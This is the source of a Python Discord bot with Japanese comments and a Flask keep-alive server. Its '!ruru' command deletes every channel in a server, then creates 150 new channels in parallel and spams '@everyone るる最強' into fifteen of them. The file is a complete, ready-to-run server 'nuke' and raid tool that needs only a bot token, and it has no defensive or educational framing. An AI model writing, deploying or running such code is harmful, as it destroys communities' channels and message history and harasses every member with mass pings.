import os
import threading
import asyncio
from flask import Flask
import discord
from discord.ext import commands

# --- KeepAlive Server for Render & UptimeRobot ---
app = Flask(__name__)

@app.route("/")
def home():
    """UptimeRobotからのヘルスチェックに応答"""
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))  # Renderが設定するPORTを使用
    print(f"Starting Flask server on port {port}...")
    app.run(host="0.0.0.0", port=port)

def keep_alive():
    t = threading.Thread(target=run_flask)
    t.start()
    print("Keep-alive server started.")

# --- Discord Bot Setup ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

# --- ⚠️ チャンネル削除＆高速生成＆メッセージ送信コマンド ---
@bot.command()
@commands.has_permissions(administrator=True)
async def ruru(ctx):
    # すべてのチャンネルを削除
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception:
            pass

    # チャンネル名リストを作成（ch-001 ~ ch-150）
    channel_names = [f"ch-{i:03}" for i in range(1, 151)]

    # 並行して全チャンネル生成
    tasks = [ctx.guild.create_text_channel(name) for name in channel_names]
    created_channels = await asyncio.gather(*tasks)

    # 150個中、先頭15個のチャンネルに @everyone で「るる最強」を送信
    send_tasks = []
    for channel in created_channels[:15]:
        send_tasks.append(channel.send("@everyone るる最強"))

    await asyncio.gather(*send_tasks)
    await ctx.send("150個のチャンネルを生成し、先頭15個にメッセージ送信しました！")

# --- Main Execution ---
if __name__ == "__main__":
    TOKEN = os.environ.get("DISCORD_TOKEN")

    if not TOKEN:
        print("エラー: 環境変数 'DISCORD_TOKEN' が設定されていません。")
    else:
        keep_alive()
        bot.run(TOKEN)
